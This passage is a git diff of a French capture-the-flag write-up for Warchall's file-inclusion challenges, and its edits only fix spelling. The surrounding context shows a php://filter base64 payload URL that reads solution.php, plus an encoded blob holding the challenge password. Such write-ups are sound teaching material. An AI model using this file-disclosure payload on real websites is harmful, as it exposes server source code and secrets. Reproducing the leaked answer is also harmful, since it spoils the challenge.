@@ -113,7 +113,7 @@ export PATH=$HOME:$PATH
   <pre>https://lfi.warchall.net/index.php?lang=en</pre>
 - Puis on change comme ci-dessous l'URL :
   <pre>https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</pre>
-- On utilise ici ***php://filter*** pour introduire ***l'encodage en base64*** , et on utilise l'encodage en base64 pour contourner les filtres ou les contrôles de sécurités mis en places .  
+- On utilise ici ***php://filter*** pour introduire ***l'encodage en base64*** , et on utilise l'encodage en base64 pour contourner les filtres ou les contrôles de sécurités mis en places par le site.  
 - Puis on actualise et le contenu change et cela s'affiche :
   ```plaintext
 
@@ -143,11 +143,11 @@ export PATH=$HOME:$PATH
   https://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php
 
  - La page d'acceuil s'affichera mais il y a un long message et des messages de ***Warning*** qui sont ajoutées .
- - Nous allons ensuite copier le texte incomprehensible et le decoder avec les commandes suivantes :
+ - Nous allons ensuite copier le texte incompréhensible et le decoder avec les commandes suivantes :
  - `echo " ` :
    ```
    PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K
 
- - `" | base64 -d -i ` : et le mot de passe s'affichera ensuite tout en bas a gauche  .
+ - `" | base64 -d -i ` : et le mot de passe s'affichera ensuite tout en bas à gauche  .
 
 
